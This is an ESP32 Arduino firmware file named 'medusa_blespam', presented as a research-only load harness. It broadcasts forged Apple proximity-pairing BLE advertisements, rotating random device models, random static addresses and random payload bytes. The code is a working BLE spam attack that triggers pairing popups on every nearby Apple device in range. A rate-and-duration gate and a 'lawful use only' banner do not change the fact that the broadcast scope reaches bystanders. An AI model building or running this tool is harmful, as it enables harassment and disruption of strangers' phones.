/*
 * medusa_blespam — research-only BLE advertisement-handling load harness.
 *
 * The prototype varies advertisement identity and payload fields to study how
 * owned lab receivers handle repeated proximity-style advertisements. It is not
 * exposed by the default product and receiver behavior is unverified.
 *
 * Any future supported resilience test requires an explicit scope, bounded
 * rate/duration, audit record, confirmation, and persistent stop path.
 */
#include <Arduino.h>
#include "esp_bt.h"
#include "esp_bt_main.h"
#include "esp_gap_ble_api.h"
#include "medusa_tx_common.h"

// Apple proximity-pairing device models (hi, lo) — the popup varies per model.
static const uint8_t MODELS[][2] = {
  {0x02, 0x0F}, {0x0E, 0x20}, {0x0A, 0x20}, {0x0F, 0x20}, {0x13, 0x20},
  {0x14, 0x20}, {0x0B, 0x20}, {0x0C, 0x20}, {0x11, 0x20}, {0x16, 0x20},
};
static const int N_MODELS = sizeof(MODELS) / sizeof(MODELS[0]);

static esp_ble_adv_params_t adv_params = {
  .adv_int_min = 0x20,
  .adv_int_max = 0x30,
  .adv_type = ADV_TYPE_NONCONN_IND,
  .own_addr_type = BLE_ADDR_TYPE_RANDOM,
  .channel_map = ADV_CHNL_ALL,
  .adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
};

static void gap_cb(esp_gap_ble_cb_event_t event, esp_ble_gap_cb_param_t* param) {
  if (event == ESP_GAP_BLE_ADV_DATA_RAW_SET_COMPLETE_EVT)
    esp_ble_gap_start_advertising(&adv_params);
}

static uint32_t sent = 0;

// ---- gated advertising --------------------------------------------------
// BLE advertises rather than sending addressed frames, so the gate sits where
// a new advertisement is published. The policy is the same one the Wi-Fi
// transmitters use: session, rate ceiling, duration and latched stop.
//
// Scope for a broadcast advertisement is the broadcast address, because that
// is what an advertisement actually reaches — pretending otherwise would put
// a target in the audit log that nobody was addressing.
static const uint8_t adv_scope[MTG_MAC_LEN] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
static bool adv_session_ready = false;

static void adv_session_start(void) {
  mcfg_t cfg;
  mcfg_defaults(&cfg);
  cfg.allow_broadcast = true;   // an advertisement cannot be anything else
  uint8_t allow[1][MTG_MAC_LEN];
  memcpy(allow[0], adv_scope, MTG_MAC_LEN);
  mtg_session_grant_t grant;
  adv_session_ready = medusa_tx_begin(&cfg, MCFG_PROFILE_BLE_ADV, allow, 1, true, millis(), &grant);
  if (!adv_session_ready) {
    Serial.println("advertising refused: no session (a stop may be latched).");
    return;
  }
  Serial.printf("advertising session: %lu ms, %u per sec\n",
                (unsigned long)grant.duration_ms, (unsigned)grant.rate_per_sec);
}

// Returns true when publishing another advertisement is permitted.
static bool adv_permitted(void) {
  if (!adv_session_ready) return false;
  static const uint8_t one = 0;   // the gate needs a payload pointer, not the payload
  return medusa_tx_send(&one, 1, adv_scope, millis()) >= 0;
}

void setup() {
  Serial.begin(115200);
  delay(600);
  Serial.println("\n=== medusa_blespam ===");
  Serial.println("LAWFUL USE ONLY - your own devices / authorized tests.");
  esp_bt_controller_config_t cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
  esp_bt_controller_init(&cfg);
  esp_bt_controller_enable(ESP_BT_MODE_BLE);
  esp_bluedroid_init();
  esp_bluedroid_enable();
  esp_ble_gap_register_callback(gap_cb);
  adv_session_start();
  Serial.println("BLE advertisement load harness up — rotating identities, gated");
}

void loop() {
  if (!adv_permitted()) {
    // Refused: stop advertising rather than continuing at an unpermitted rate.
    esp_ble_gap_stop_advertising();
    delay(200);
    return;
  }
  esp_ble_gap_stop_advertising();
  uint8_t rnd[6];
  for (int i = 0; i < 6; i++) rnd[i] = esp_random() & 0xFF;
  rnd[0] |= 0xC0;                                   // random static address
  esp_ble_gap_set_rand_addr(rnd);

  const uint8_t* m = MODELS[esp_random() % N_MODELS];
  uint8_t adv[31];
  adv[0] = 0x1E; adv[1] = 0xFF; adv[2] = 0x4C; adv[3] = 0x00;  // Apple manufacturer
  adv[4] = 0x07; adv[5] = 0x19; adv[6] = 0x07;                 // proximity pairing
  adv[7] = m[0]; adv[8] = m[1];
  adv[9] = 0x55;                                               // status
  for (int i = 10; i < 31; i++) adv[i] = esp_random() & 0xFF;  // payload/auth padding
  esp_ble_gap_config_adv_data_raw(adv, sizeof(adv));           // gap_cb starts the advert
  sent++;

  static uint32_t last = 0;
  if (millis() - last > 500) { last = millis(); Serial.printf("ble spam sent=%u\n", sent); }
  delay(medusa_tx_pacing_ms());
}
